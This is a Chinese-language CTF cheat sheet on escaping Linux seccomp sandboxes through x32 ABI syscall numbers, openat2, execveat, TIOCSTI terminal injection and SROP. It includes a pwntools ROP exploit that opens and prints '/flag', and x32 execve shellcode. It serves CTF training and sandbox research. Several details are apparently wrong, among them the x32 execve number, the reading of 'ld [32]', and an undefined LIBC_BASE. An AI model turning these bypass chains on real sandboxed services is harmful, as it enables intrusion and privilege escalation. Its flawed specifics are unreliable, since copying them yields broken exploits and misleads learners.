---
title: seccomp 高级绕过 —— x32 ABI 混淆、openat2 与 TIOCSTI
category: pwn
tags: [seccomp, x32 ABI, openat2, TIOCSTI, orw]
signals: [checksec 显示 seccomp 沙箱已启用且有 BPF 规则, 只允许 open read write 而不允许 execve, 规则里只检查 syscall 号没有检查 arch 字段, 程序需要读取 flag 但 open 被禁用, 可以利用 tty 的 ioctl, 目标是拿到 shell 而不仅仅是读文件]
difficulty: hard
source: "seccomp(2) man page / Linux kernel seccomp filter docs / x32 ABI syscall 混淆"
tools: [pwntools, seccomp-tools, gdb, pwndbg]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- `seccomp-tools dump ./pwn` 能看到 BPF 规则；`checksec` 显示 `Seccomp: Enabled`。
- 规则只放行 `open/read/write`（ORW），`execve` 直接 `KILL`。
- **BPF 只检查 `seccomp_data.nr`，没有检查 `arch` 字段** —— 这是 x32 绕过的信号。
- 或者规则把 `open` 禁了但 `openat` 还在，或者反过来。
- 程序与终端交互（`stdin` 是 tty），且后续会执行 `system` / `bash`。
- 目标不是「读 flag 输出」而是「拿到交互式 shell」。
- `openat2` 没被禁，但 `open` 被禁（ruleset 版本较旧）。

## 二、原理

### 1. seccomp BPF 的结构

```c
struct seccomp_data {
    int   nr;                    // 系统调用号
    __u32 arch;                  // AUDIT_ARCH_X86_64 = 0xC000003E / AUDIT_ARCH_I386 = 0x40000003
    __u64 instruction_pointer;
    __u64 args[6];
};
```

典型规则：

```c
BPF_STMT(BPF_LD  | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read,  0, 1),
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
...
```

**如果规则没有对 `arch` 做 `AUDIT_ARCH_X86_64` 判断**，就存在下面几种经典绕过。

### 2. x32 ABI（`__X32_SYSCALL_BIT = 0x40000000`）

x86-64 内核同时支持 x32 ABI，系统调用号 = `0x40000000 | nr`。若 BPF 只比对 `nr == __NR_execve(59)`：

- **白名单**规则：`0x4000003B` 不匹配任何允许项 → 被拒，不可绕。
- **黑名单**规则（匹配即拒绝，其余放行）：`0x4000003B` 落进 `RET_ALLOW` → **直接绕过**。

`man 2 seccomp` 明确警告：**只比对 `nr` 而不比对 `arch` 的过滤器可被 x32 ABI 绕过**。
实践中 x32 更多用于拿 `read/write` 等号逃过参数检查，直接 x32 `execve` 需要 32 位兼容入口。

### 3. `openat2`（`__NR_openat2 = 437`）

`open`/`openat` 都被禁但 `openat2` 没被禁时：

```c
struct open_how {
    __u64 flags;
    __u64 mode;
    __u64 resolve;
};
// openat2(AT_FDCWD, "/flag", &how, sizeof(how))
```

`openat2` 是 5.6 引入的新 syscall，2021 年前的规则往往漏掉。

### 4. `TIOCSTI`（0x5412）

`ioctl(fd, TIOCSTI, &c)` 可向终端输入缓冲注入字符：ORW 沙箱里 `execve` 被禁但 `system` / `setuid`
可用时，把 `cat /flag\n` 逐字符塞进 tty 即可。`6.2+` 内核默认限制（需 `CAP_SYS_ADMIN`），CTF 内核多可。
### 5. 其它高级手法

| 手法 | 思路 |
| --- | --- |
| `execveat`(322) | `execve` 被禁时用 `execveat(AT_FDCWD, path, argv, envp, 0)` |
| `openat` / `creat` | `open` 被禁但其它打开方式漏了 |
| `TIOCSTI`(0x5412) | 向 tty 输入队列逐字符注入命令，配合被允许的 `system`/`execve` |
| `mmap + SROP` | 用 `rt_sigreturn` 直接设置 `cs=0x23` 走 32 位兼容 |
| `openat2`(437) | 5.6 引入，2021 年前的规则普遍漏掉 |

## 三、解题步骤

1. **抓出 BPF**
```bash
seccomp-tools dump ./pwn         # 按空格交出完整规则
seccomp-tools dump ./pwn | grep -E 'arch|nr'
```
2. **判断规则类型**：白名单（`>=` 比较 + 拒绝）还是黑名单（`==` 比较 + 拒绝）。
3. **找漏网 syscall**
   - 没有 `arch` 判断 → 尝试 x32 号（`0x40000000 | nr`）。
   - 缺 `openat2`(437) / `execveat`(322) / `openat`(257) → 直接换用。
4. **构造 ORW 链**：
```python
rop += [pop_rdi, AT_FDCWD, pop_rsi, flag_path, pop_rdx, 0]
rop += [openat, ...]
```
5. **若目标要 shell**：用 `TIOCSTI` 注入命令，或 `execveat`。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# seccomp ORW 绕过：优先 openat2，再退回 x32 open，最后 execveat
from pwn import *

context.binary = elf = ELF('./pwn')
context.arch = 'amd64'
libc = ELF('./libc.so.6')
context.log_level = 'info'

io = process(elf.path)

# ---------- 0. 先用 seccomp-tools 审阅规则 ----------
# 本脚本假设：open/openat 被禁，openat2 / execveat 未禁
NR_READ, NR_WRITE = 0, 1
NR_OPENAT  = 257
NR_OPENAT2 = 437
NR_EXECVEAT = 322

def syscall_rop(nr, args):
    """生成 syscall(nr, args...) 的 ROP 片段"""
    regs = ['rdi', 'rsi', 'rdx', 'r10', 'r8', 'r9']
    chain = []
    for reg, val in zip(regs, args):
        chain += [pops[reg], val]
    chain += [pops['rax'], nr]
    chain += [syscall_ret]
    return flat(chain)

# ---------- 1. 找 gadget ----------
libc_base = LIBC_BASE
def g(asmstr):
    return libc_base + next(libc.search(asm(asmstr), executable=True))

pops = {r: g(f'pop {r}; ret') for r in ['rdi', 'rsi', 'rdx', 'rax', 'r10']}
syscall_ret = g('syscall; ret')

# ---------- 2. 构造 ORW ----------
bss  = elf.bss() + 0x800
flag = bss + 0x100
buf  = bss + 0x200
how  = bss + 0x300               # struct open_how（24 字节，全 0 即 O_RDONLY）

rop  = b''
# openat2(AT_FDCWD, "/flag", &how, sizeof(how))
rop += syscall_rop(NR_READ, [0, flag, 0x100])            # 先把 "/flag" 读进 bss
rop += syscall_rop(NR_OPENAT2, [0xffffff9c, flag, how, 0x18])
# read(fd=3, buf, 0x100)
rop += syscall_rop(NR_READ, [3, buf, 0x100])
# write(1, buf, 0x100)
rop += syscall_rop(NR_WRITE, [1, buf, 0x100])

# ---------- 3. 发送 ----------
io.sendafter(b'input: ', flat({0x40: rop}))
io.send(b'/flag\x00')            # 第一阶段 read 的内容
io.interactive()
```

### x32 ABI 绕过（黑名单漏掉了 x32 号）

```python
from pwn import *

# 场景：BPF 黑名单只禁了 nr == 59 (execve)，且未检查 arch
shellcode = asm("""
    mov rax, 0x4000003b          // x32 execve
    lea rdi, [rip + cmd]
    xor esi, esi
    xor edx, edx
    syscall
    cmd: .asciz "/bin/sh"
""")
# 注意：x32 execve 需要 32 位兼容入口，多数场景改用 execveat(322)
```

## 五、常见坑 / 变体

1. **规则里检查了 `arch`**：x32 路线被封死，转 `openat2` / `execveat` / `TIOCSTI`。
2. **白名单过滤**：未列出的 syscall 一律 `KILL`，只有明确漏掉的才有戏。
3. **`openat2` 需要内核 ≥ 5.6**，题目内核态是 `5.15 / 6.1` 时可用，老内核（`4.4`）不行。
4. **`openat2` 的 `struct open_how` 必须 24 字节且 `resolve` 为 0**，写错直接 `EINVAL`。
5. **`fd` 不一定是 3**：本地测试时标准 IO 已占用，实际返回常是 `3`/`4`，要用 `show` 打印。
6. **`TIOCSTI` 在 `6.2+` 受限**：需要 `CAP_SYS_ADMIN`，CTF 内核多未开启该限制。
7. **`seccomp-tools` 输出字节偏移**：`dump` 里 `ld [4]` 表示读 `offset 4`（`nr`），`ld [32]` 表示读寄存器 —— 便于判断。
8. **`execveat` 需要 `argv` 非空**：`execveat(fd, NULL, {"/bin/sh", NULL}, NULL, 0)` 正确写法。
9. **变体：SROP + `cs=0x23`** —— 只禁 `execve` 而允许 `rt_sigreturn` 时，可直接构造 32 位运行时。

## 六、参考来源

- [seccomp(2) man page（含 x32 ABI 绕过警告）](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [Linux 内核文档：Seccomp BPF](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)
- [seccomp-tools（BPF 反汇编）](https://github.com/david942j/seccomp-tools)
- [openat2(2) man page（`struct open_how`）](https://man.archlinux.org/man/openat2.2)
- [tripoloski1337：用 x32 ABI 绕过 seccomp](https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html)
- [CTF-Wiki：seccomp 沙箱逃逸](https://ctf-wiki.org/pwn/sandbox/seccomp/c-sandbox-escape/)
